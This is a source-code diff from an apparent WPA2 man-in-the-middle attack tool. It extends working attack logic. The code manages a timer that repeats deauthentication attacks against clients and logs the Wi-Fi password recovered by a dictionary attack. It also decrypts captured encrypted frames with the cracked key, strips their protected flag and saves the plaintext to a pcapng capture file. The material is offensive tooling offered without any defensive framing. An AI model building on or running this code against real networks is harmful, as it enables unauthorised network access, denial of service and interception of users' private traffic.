@@ -2,7 +2,7 @@
 #include "../../MITM.h"
 
 extern int debug_level;
-
+u8 packet_buffer[MTU];
 /* Predeclare */
 static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, size_t len);
 
@@ -77,6 +77,8 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 	    !(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
 	    !(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
 			packet->auth_data.data_len > 0) {
+    if (eloop_is_timeout_registered(deauth_attack, NULL, MITM))
+      eloop_cancel_timeout(deauth_attack, NULL, MITM);
 		log_printf(MSG_DEBUG, "Capture 2 of 4-way pakcet, fill SN,SA");
         info->version = packet->auth_data.key_information & WPA_KEY_INFO_TYPE_MASK;
 		memcpy(info->SN, packet->auth_data.Nonce, NONCE_ALEN);	
@@ -118,8 +120,9 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 				log_printf(MSG_INFO, "[CRASH] Crash WPA2 encryption success!"RED" SSID = %s, Password = %s"NONE, 
 						info->SSID, info->password);
 				*state = MITM_state_ready;
-				info->enough = 0;
         l2_packet_change_callback(MITM->l2_packet, peek_encrypted_data);
+        write_header(MITM->pcapng_path, DLT_IEEE802_11_RADIO, 0, MTU);
+        info->enough = 0;
 			} else {
 				log_printf(MSG_DEBUG, "Dictionary attack failed\n");
 				return -1;
@@ -275,12 +278,13 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 
 static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, size_t len) {
   struct MITM *MITM = (struct MITM *)ctx;
+  int position; /* stroage protected flag position. */
   uint16_t type;
-//  if (!memcmp(src_addr, MITM->encry_info.SA, ETH_ALEN) || !memcmp(src_addr, MITM->encry_info.AA, ETH_ALEN))
-//    return;
-
+  struct os_reltime date;
+  memset(packet_buffer, 0, MTU);
   u32 offset;
   offset = ((struct ieee80211_radiotap_header *)buf)->it_len;
+  position = offset;
   if (offset > len) return;
   type = WLAN_PARSE_TYPE(ntohs(*(uint16_t *)(buf + offset)));
 
@@ -299,18 +303,25 @@ static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, 
         return;
     offset += sizeof(struct ieee80211_hdr_3addr);
     if (packet.type == IEEE80211_QOS_DATA) offset += 2;
+    memcpy(packet_buffer, buf, offset);
     if (packet.ieee80211_header.frame_control & ntohs(WLAN_FC_PROTECTED)) {
+      packet_buffer[position + 1] &= ~WLAN_FC_PROTECTED; 
       /* Encryption Data */
       size_t plain_len;
       u8 *plain;
       plain = ccmp_decrypt(MITM->encry_info.ptk.tk1, hdr,
                            buf + offset, len - offset, &plain_len);
       if (!plain) {
+        if (eloop_is_timeout_registered(deauth_attack, NULL, MITM) != 1) {
         /* Can't crack data, PTK may wrong. We should start deauth attack again. */
-        log_printf(MSG_DEBUG, "Plain can't crack, start deauthentication attack to get a new PTK.");
-        eloop_register_timeout(5, 0, deauth_attack, NULL, MITM);
+          log_printf(MSG_DEBUG, "Plain can't crack, start deauth attack to get a new PTK.");
+          eloop_register_timeout(5, 0, deauth_attack, NULL, MITM);
+        }
       } else {
-        lamont_hdump(MSG_DEBUG, "Decryption plain", plain, plain_len);
+//        lamont_hdump(MSG_DEBUG, "Decryption plain", plain, plain_len);
+        memcpy(packet_buffer + offset, plain, plain_len);
+        os_get_reltime(&date);
+        write_packet_to_file(MITM->pcapng_path, packet_buffer, offset + plain_len, 0, date.sec);
       }
     } else {
       /* Non-Encryption Data */
